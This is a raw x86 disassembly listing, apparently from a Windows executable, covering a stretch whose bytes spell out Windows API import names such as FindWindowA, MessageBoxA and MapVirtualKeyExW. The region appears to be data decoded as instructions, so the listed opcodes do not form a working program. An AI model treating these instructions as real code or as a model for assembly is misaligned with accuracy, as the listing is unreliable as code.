  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
